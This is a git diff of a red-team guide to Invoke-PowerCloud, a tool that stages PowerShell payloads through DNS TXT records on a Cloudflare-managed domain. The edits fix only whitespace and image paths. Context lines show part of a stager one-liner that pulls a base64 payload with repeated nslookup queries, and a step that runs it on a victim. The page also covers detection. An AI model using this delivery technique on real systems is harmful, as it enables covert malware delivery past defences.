@@ -22,7 +22,7 @@ Not only that, I want to thank Dominic for taking his time to answer some of my 
 
 I assume you have read [PowerShell DNS Delivery with PowerDNS](https://www.mdsec.co.uk/2017/07/powershell-dns-delivery-with-powerdns/) which explains how PowerDNS works.
 
-Invoke-PowerCloud works in a similar fashion, except for a couple of key differences, which may simplify the configuration process of your infrastructure to start delivering paylods via DNS. \
+Invoke-PowerCloud works in a similar fashion, except for a couple of key differences, which may simplify the configuration process of your infrastructure to start delivering paylods via DNS.\
 \
 **With PowerDNS you need:**
 
@@ -54,18 +54,18 @@ If you run the tool again to deliver another payload, the previous DNS TXT recor
 
 ### One off Configuration
 
-Remember - you need a cloudflare.com account for this to work. Assuming you have that, you need to edit the Invoke-PowerCloud as follows:&#x20;
+Remember - you need a cloudflare.com account for this to work. Assuming you have that, you need to edit the Invoke-PowerCloud as follows:
 
 1. your cloudflare API key, defined in the variable `$Global:API_KEY`
 2. your cloudflare email address, defined in the variable `$Global:EMAIL`
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-15 22-11-03.png>)
+![](<../../.gitbook/assets/Screenshot from 2018-10-15 22-11-03 (1).png>)
 
 ### DNS Management
 
 Secondly, you need to move the domain name which you are going to use for payload delivery to cloudflare. In this demo, I will use a domain I own `redteam.me` which is now managed by cloudflare:
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-15 22-14-53.png>)
+![](../../.gitbook/assets/screenshot-from-2018-10-15-22-14-53.png)
 
 Let's confirm redteam.me DNS is managed by cloudflare by issuing:
 
@@ -73,7 +73,7 @@ Let's confirm redteam.me DNS is managed by cloudflare by issuing:
 host -t ns redteam.me
 ```
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-15 22-16-20.png>)
+![](../../.gitbook/assets/screenshot-from-2018-10-15-22-16-20.png)
 
 ### Payload
 
@@ -102,11 +102,11 @@ $b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.redteam.me")[-1] }
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-15 22-47-26.png>)
+![](../../.gitbook/assets/screenshot-from-2018-10-15-22-47-26.png)
 
 Let's execute the stager on the victim system to get the payload delivered via DNS:
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-15 22-47-12.png>)
+![](../../.gitbook/assets/screenshot-from-2018-10-15-22-47-12.png)
 
 ### Animated Demo
 
@@ -136,11 +136,11 @@ For those wondering about detection possibilities, the following is a list of si
 
 Below is a snippet of the PCAP showing DNS traffic from the above demo - note the TXT Length and the data itself:
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-16 20-12-57.png>)
+![](../../.gitbook/assets/screenshot-from-2018-10-16-20-12-57.png)
 
 Spike of `nslookup` for a host in a short amount of time:
 
-![](<../../.gitbook/assets/Screenshot from 2018-10-16 20-17-42.png>)
+![](../../.gitbook/assets/screenshot-from-2018-10-16-20-17-42.png)
 
 Below is a sample PCAP for your inspection:
 
